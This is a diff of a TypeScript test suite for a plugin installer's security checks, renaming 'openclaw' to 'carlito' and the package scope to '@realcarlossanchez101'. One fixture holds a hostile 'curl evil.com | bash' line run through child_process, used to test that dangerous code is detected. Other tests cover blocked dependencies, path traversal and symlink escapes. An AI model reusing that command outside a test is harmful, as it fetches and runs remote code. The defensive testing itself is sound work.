@@ -2,8 +2,8 @@ import fs from "node:fs";
 import path from "node:path";
 import * as tar from "tar";
 import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
+import { resolveCarlitoPackageRootSync } from "../infra/carlito-root.js";
 import { safePathSegmentHashed } from "../infra/install-safe-path.js";
-import { resolveOpenClawPackageRootSync } from "../infra/openclaw-root.js";
 import { runCommandWithTimeout } from "../process/exec.js";
 import { expectSingleNpmInstallIgnoreScriptsCall } from "../test-utils/exec-assertions.js";
 import { expectInstallUsesIgnoreScripts } from "../test-utils/npm-spec-install-test-helpers.js";
@@ -22,8 +22,8 @@ vi.mock("../process/exec.js", () => ({
   runCommandWithTimeout: vi.fn(),
 }));
 
-vi.mock("../infra/openclaw-root.js", () => ({
-  resolveOpenClawPackageRootSync: vi.fn(),
+vi.mock("../infra/carlito-root.js", () => ({
+  resolveCarlitoPackageRootSync: vi.fn(),
 }));
 
 const resolveCompatibilityHostVersionMock = vi.fn();
@@ -53,7 +53,7 @@ const archiveFixturePathCache = new Map<string, string>();
 const dynamicArchiveTemplatePathCache = new Map<string, string>();
 let installPluginFromDirTemplateDir = "";
 let manifestInstallTemplateDir = "";
-const suiteTempRootTracker = createSuiteTempRootTracker("openclaw-plugin-install");
+const suiteTempRootTracker = createSuiteTempRootTracker("carlito-plugin-install");
 const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
   {
     outName: "traversal.tgz",
@@ -61,7 +61,7 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/..",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      carlito: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
@@ -70,14 +70,14 @@ const DYNAMIC_ARCHIVE_TEMPLATE_PRESETS = [
     packageJson: {
       name: "@evil/.",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      carlito: { extensions: ["./dist/index.js"] },
     } as Record<string, unknown>,
   },
   {
     outName: "bad.tgz",
     withDistIndex: false,
     packageJson: {
-      name: "@openclaw/nope",
+      name: "@realcarlossanchez101/nope",
       version: "0.0.1",
     } as Record<string, unknown>,
   },
@@ -244,7 +244,7 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
     fs.writeFileSync(packageJsonPath, JSON.stringify(manifest), "utf-8");
   }
   fs.writeFileSync(
-    path.join(pluginDir, "openclaw.plugin.json"),
+    path.join(pluginDir, "carlito.plugin.json"),
     JSON.stringify({
       id: params.manifestId,
       configSchema: { type: "object", properties: {} },
@@ -257,12 +257,12 @@ function setupManifestInstallFixture(params: { manifestId: string; packageName?:
 function setPluginMinHostVersion(pluginDir: string, minHostVersion: string) {
   const packageJsonPath = path.join(pluginDir, "package.json");
   const manifest = JSON.parse(fs.readFileSync(packageJsonPath, "utf-8")) as {
-    openclaw?: { install?: Record<string, unknown> };
+    carlito?: { install?: Record<string, unknown> };
   };
-  manifest.openclaw = {
-    ...manifest.openclaw,
+  manifest.carlito = {
+    ...manifest.carlito,
     install: {
-      ...manifest.openclaw?.install,
+      ...manifest.carlito?.install,
       minHostVersion,
     },
   };
@@ -375,15 +375,15 @@ function setupDualFormatInstallFixture(params: { bundleFormat: "codex" | "claude
   fs.writeFileSync(
     path.join(pluginDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/native-dual",
+      name: "@realcarlossanchez101/native-dual",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      carlito: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(pluginDir, "openclaw.plugin.json"),
+    path.join(pluginDir, "carlito.plugin.json"),
     JSON.stringify({
       id: "native-dual",
       configSchema: { type: "object", properties: {} },
@@ -412,7 +412,7 @@ async function expectArchiveInstallReservedSegmentRejection(params: {
     packageJson: {
       name: params.packageName,
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      carlito: { extensions: ["./dist/index.js"] },
     },
     outName: params.outName,
     withDistIndex: true,
@@ -515,9 +515,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(installPluginFromDirTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/test-plugin",
+      name: "@realcarlossanchez101/test-plugin",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      carlito: { extensions: ["./dist/index.js"] },
       dependencies: { "left-pad": "1.3.0" },
     }),
     "utf-8",
@@ -533,9 +533,9 @@ beforeAll(async () => {
   fs.writeFileSync(
     path.join(manifestInstallTemplateDir, "package.json"),
     JSON.stringify({
-      name: "@openclaw/cognee-openclaw",
+      name: "@realcarlossanchez101/cognee-carlito",
       version: "0.0.1",
-      openclaw: { extensions: ["./dist/index.js"] },
+      carlito: { extensions: ["./dist/index.js"] },
     }),
     "utf-8",
   );
@@ -545,7 +545,7 @@ beforeAll(async () => {
     "utf-8",
   );
   fs.writeFileSync(
-    path.join(manifestInstallTemplateDir, "openclaw.plugin.json"),
+    path.join(manifestInstallTemplateDir, "carlito.plugin.json"),
     JSON.stringify({
       id: "manifest-template",
       configSchema: { type: "object", properties: {} },
@@ -594,7 +594,11 @@ describe("installPluginFromArchive", () => {
       archivePath: archiveV1,
       extensionsDir,
     });
-    expectSuccessfulArchiveInstall({ result: first, stateDir, pluginId: "@openclaw/voice-call" });
+    expectSuccessfulArchiveInstall({
+      result: first,
+      stateDir,
+      pluginId: "@realcarlossanchez101/voice-call",
+    });
 
     const duplicate = await installPluginFromArchive({
       archivePath: archiveV1,
@@ -633,7 +637,7 @@ describe("installPluginFromArchive", () => {
       archivePath,
       extensionsDir,
     });
-    expectSuccessfulArchiveInstall({ result, stateDir, pluginId: "@openclaw/zipper" });
+    expectSuccessfulArchiveInstall({ result, stateDir, pluginId: "@realcarlossanchez101/zipper" });
   });
 
   it("allows archive installs with dangerous code patterns when forced unsafe install is set", async () => {
@@ -646,7 +650,7 @@ describe("installPluginFromArchive", () => {
       packageJson: {
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["./dist/index.js"] },
+        carlito: { extensions: ["./dist/index.js"] },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -671,9 +675,9 @@ describe("installPluginFromArchive", () => {
   it("installs flat-root plugin archives from ClawHub-style downloads", async () => {
     const result = await installArchivePackageAndReturnResult({
       packageJson: {
-        name: "@openclaw/rootless",
+        name: "@realcarlossanchez101/rootless",
         version: "0.0.1",
-        openclaw: { extensions: ["./dist/index.js"] },
+        carlito: { extensions: ["./dist/index.js"] },
       },
       outName: "rootless-plugin.tgz",
       withDistIndex: true,
@@ -697,31 +701,31 @@ describe("installPluginFromArchive", () => {
     }
   });
 
-  it("rejects packages without openclaw.extensions", async () => {
+  it("rejects packages without carlito.extensions", async () => {
     const result = await installArchivePackageAndReturnResult({
-      packageJson: { name: "@openclaw/nope", version: "0.0.1" },
+      packageJson: { name: "@realcarlossanchez101/nope", version: "0.0.1" },
       outName: "bad.tgz",
     });
     expect(result.ok).toBe(false);
     if (result.ok) {
       return;
     }
-    expect(result.error).toContain("openclaw.extensions");
-    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_OPENCLAW_EXTENSIONS);
+    expect(result.error).toContain("carlito.extensions");
+    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_CARLITO_EXTENSIONS);
   });
 
-  it("rejects legacy plugin package shape when openclaw.extensions is missing", async () => {
+  it("rejects legacy plugin package shape when carlito.extensions is missing", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
       path.join(pluginDir, "package.json"),
       JSON.stringify({
-        name: "@openclaw/legacy-entry-fallback",
+        name: "@realcarlossanchez101/legacy-entry-fallback",
         version: "0.0.1",
       }),
       "utf-8",
     );
     fs.writeFileSync(
-      path.join(pluginDir, "openclaw.plugin.json"),
+      path.join(pluginDir, "carlito.plugin.json"),
       JSON.stringify({
         id: "legacy-entry-fallback",
         configSchema: { type: "object", properties: {} },
@@ -737,12 +741,12 @@ describe("installPluginFromArchive", () => {
 
     expect(result.ok).toBe(false);
     if (!result.ok) {
-      expect(result.error).toContain("package.json missing openclaw.extensions");
+      expect(result.error).toContain("package.json missing carlito.extensions");
       expect(result.error).toContain("update the plugin package");
-      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_OPENCLAW_EXTENSIONS);
+      expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.MISSING_CARLITO_EXTENSIONS);
       return;
     }
-    expect.unreachable("expected install to fail without openclaw.extensions");
+    expect.unreachable("expected install to fail without carlito.extensions");
   });
 
   it("blocks package installs when plugin contains dangerous code patterns", async () => {
@@ -753,7 +757,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -780,7 +784,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -810,7 +814,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
         dependencies: {
           "safe-name": "npm:plain-crypto-js@^4.2.1",
         },
@@ -838,7 +842,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "override-aliased-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
         overrides: {
           "@scope/parent": {
             "safe-name": "npm:plain-crypto-js@^4.2.1",
@@ -870,7 +874,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "vendored-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -904,7 +908,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-dir-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -931,7 +935,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-file-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -958,7 +962,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "blocked-package-extensionless-file-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -987,7 +991,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1021,7 +1025,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1055,7 +1059,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-file-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1091,7 +1095,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "blocked-package-nested-file-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1129,7 +1133,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "allowed-scoped-symlink-target-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1158,7 +1162,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "outside-root-symlink-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1189,7 +1193,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-path-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1211,7 +1215,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "non-node-modules-file-alias-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1231,7 +1235,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "wide-vendored-tree-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1273,7 +1277,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the directory cap", async () => {
-    vi.stubEnv("OPENCLAW_INSTALL_SCAN_MAX_DIRECTORIES", "4");
+    vi.stubEnv("CARLITO_INSTALL_SCAN_MAX_DIRECTORIES", "4");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1281,7 +1285,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "directory-cap-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1301,7 +1305,7 @@ describe("installPluginFromArchive", () => {
   });
 
   it("fails package installs when manifest traversal exceeds the depth cap", async () => {
-    vi.stubEnv("OPENCLAW_INSTALL_SCAN_MAX_DEPTH", "2");
+    vi.stubEnv("CARLITO_INSTALL_SCAN_MAX_DEPTH", "2");
 
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     fs.writeFileSync(
@@ -1309,7 +1313,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "depth-cap-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1342,7 +1346,7 @@ describe("installPluginFromArchive", () => {
         JSON.stringify({
           name: "unreadable-dir-plugin",
           version: "1.0.0",
-          openclaw: { extensions: ["index.js"] },
+          carlito: { extensions: ["index.js"] },
         }),
       );
       fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1378,7 +1382,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "multiple-blocked-dependencies-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1408,7 +1412,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1440,7 +1444,7 @@ describe("installPluginFromArchive", () => {
       logger: { warn: vi.fn() },
       packageDir: pluginDir,
       pluginId: "qa-matrix",
-      packageName: "@openclaw/qa-matrix",
+      packageName: "@realcarlossanchez101/qa-matrix",
       manifestId: "qa-matrix",
     });
 
@@ -1455,7 +1459,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "forced-blocked-dependency-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
         dependencies: {
           "plain-crypto-js": "^4.2.1",
         },
@@ -1771,7 +1775,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hook-findings-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1828,7 +1832,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-blocked-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1888,7 +1892,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "dangerous-forced-but-blocked-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -1931,7 +1935,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "fresh-force-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1969,7 +1973,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "replace-force-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n");
@@ -1999,7 +2003,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "hidden-entry-plugin",
         version: "1.0.0",
-        openclaw: { extensions: [".hidden/index.js"] },
+        carlito: { extensions: [".hidden/index.js"] },
       }),
     );
     fs.writeFileSync(
@@ -2026,7 +2030,7 @@ describe("installPluginFromArchive", () => {
       JSON.stringify({
         name: "scan-fail-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
       }),
     );
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};");
@@ -2075,7 +2079,7 @@ describe("installPluginFromDir", () => {
   it("strips workspace devDependencies before npm install", async () => {
     const { pluginDir, extensionsDir } = setupInstallPluginFromDirFixture({
       devDependencies: {
-        openclaw: "workspace:*",
+        carlito: "workspace:*",
         vitest: "^3.0.0",
       },
     });
@@ -2097,7 +2101,7 @@ describe("installPluginFromDir", () => {
     ) as {
       devDependencies?: Record<string, string>;
     };
-    expect(manifest.devDependencies?.openclaw).toBeUndefined();
+    expect(manifest.devDependencies?.carlito).toBeUndefined();
     expect(manifest.devDependencies?.vitest).toBe("^3.0.0");
   });
 
@@ -2149,13 +2153,13 @@ describe("installPluginFromDir", () => {
       hostVersion: "2026.3.21",
       minHostVersion: ">=2026.3.22",
       expectedCode: PLUGIN_INSTALL_ERROR_CODE.INCOMPATIBLE_HOST_VERSION,
-      expectedMessageIncludes: ["requires OpenClaw >=2026.3.22, but this host is 2026.3.21"],
+      expectedMessageIncludes: ["requires Carlito >=2026.3.22, but this host is 2026.3.21"],
     },
     {
       name: "rejects plugins with invalid minHostVersion metadata",
       minHostVersion: "2026.3.22",
       expectedCode: PLUGIN_INSTALL_ERROR_CODE.INVALID_MIN_HOST_VERSION,
-      expectedMessageIncludes: ["invalid package.json openclaw.install.minHostVersion"],
+      expectedMessageIncludes: ["invalid package.json carlito.install.minHostVersion"],
     },
     {
       name: "reports unknown host versions distinctly for minHostVersion-gated plugins",
@@ -2187,7 +2191,7 @@ describe("installPluginFromDir", () => {
     },
   );
 
-  it("uses openclaw.plugin.json id as install key when it differs from package name", async () => {
+  it("uses carlito.plugin.json id as install key when it differs from package name", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "memory-cognee",
     });
@@ -2203,7 +2207,7 @@ describe("installPluginFromDir", () => {
     expect(
       infoMessages.some((msg) =>
         msg.includes(
-          'Plugin manifest id "memory-cognee" differs from npm package name "@openclaw/cognee-openclaw"',
+          'Plugin manifest id "memory-cognee" differs from npm package name "@realcarlossanchez101/cognee-carlito"',
         ),
       ),
     ).toBe(true);
@@ -2212,7 +2216,7 @@ describe("installPluginFromDir", () => {
   it("does not warn when a scoped npm package name matches the manifest id", async () => {
     const { pluginDir, extensionsDir } = setupManifestInstallFixture({
       manifestId: "matrix",
-      packageName: "@openclaw/matrix",
+      packageName: "@realcarlossanchez101/matrix",
     });
 
     const infoMessages: string[] = [];
@@ -2242,7 +2246,7 @@ describe("installPluginFromDir", () => {
     {
       name: "package name keeps scoped plugin id by default",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@openclaw/test-plugin",
+      expectedPluginId: "@realcarlossanchez101/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2252,7 +2256,7 @@ describe("installPluginFromDir", () => {
     {
       name: "unscoped expectedPluginId resolves to scoped install id",
       setup: () => setupInstallPluginFromDirFixture(),
-      expectedPluginId: "@openclaw/test-plugin",
+      expectedPluginId: "@realcarlossanchez101/test-plugin",
       install: (pluginDir: string, extensionsDir: string) =>
         installPluginFromDir({
           dirPath: pluginDir,
@@ -2356,8 +2360,8 @@ describe("installPluginFromDir", () => {
   });
 });
 
-describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
-  const resolveRootMock = vi.mocked(resolveOpenClawPackageRootSync);
+describe("linkCarlitoPeerDependencies (via installPluginFromDir)", () => {
+  const resolveRootMock = vi.mocked(resolveCarlitoPackageRootSync);
 
   function writePluginWithPeerDeps(
     pluginDir: string,
@@ -2369,7 +2373,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       JSON.stringify({
         name: "peer-dep-plugin",
         version: "1.0.0",
-        openclaw: { extensions: ["index.js"] },
+        carlito: { extensions: ["index.js"] },
         peerDependencies,
       }),
       "utf-8",
@@ -2377,13 +2381,13 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     fs.writeFileSync(path.join(pluginDir, "index.js"), "export {};\n", "utf-8");
   }
 
-  it("creates a node_modules/openclaw symlink when peerDependencies declares openclaw", async () => {
+  it("creates a node_modules/carlito symlink when peerDependencies declares carlito", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     const run = vi.mocked(runCommandWithTimeout);
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { carlito: "*" });
 
     const { result } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
@@ -2392,7 +2396,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
       return;
     }
 
-    const symlinkPath = path.join(result.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(result.targetDir, "node_modules", "carlito");
     const stat = fs.lstatSync(symlinkPath);
     expect(stat.isSymbolicLink()).toBe(true);
     expect(fs.realpathSync(symlinkPath)).toBe(fs.realpathSync(fakeHostRoot));
@@ -2413,7 +2417,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     }
 
     const nodeModulesDir = path.join(result.targetDir, "node_modules");
-    const symlinkPath = path.join(nodeModulesDir, "openclaw");
+    const symlinkPath = path.join(nodeModulesDir, "carlito");
     expect(fs.existsSync(symlinkPath)).toBe(false);
   });
 
@@ -2422,7 +2426,7 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     const fakeHostRoot = suiteTempRootTracker.makeTempDir();
     resolveRootMock.mockReturnValue(fakeHostRoot);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { carlito: "*" });
 
     // First install
     const { result: first } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
@@ -2440,19 +2444,19 @@ describe("linkOpenClawPeerDependencies (via installPluginFromDir)", () => {
     if (!second.ok) {
       return;
     }
-    const symlinkPath = path.join(second.targetDir, "node_modules", "openclaw");
+    const symlinkPath = path.join(second.targetDir, "node_modules", "carlito");
     expect(fs.lstatSync(symlinkPath).isSymbolicLink()).toBe(true);
   });
 
-  it("warns and skips when resolveOpenClawPackageRootSync returns null", async () => {
+  it("warns and skips when resolveCarlitoPackageRootSync returns null", async () => {
     const { pluginDir, extensionsDir } = setupPluginInstallDirs();
     resolveRootMock.mockReturnValue(null);
 
-    writePluginWithPeerDeps(pluginDir, { openclaw: "*" });
+    writePluginWithPeerDeps(pluginDir, { carlito: "*" });
 
     const { result, warnings } = await installFromDirWithWarnings({ pluginDir, extensionsDir });
 
     expect(result.ok).toBe(true);
-    expect(warnings.some((w) => w.includes("Could not locate openclaw package root"))).toBe(true);
+    expect(warnings.some((w) => w.includes("Could not locate carlito package root"))).toBe(true);
   });
 });
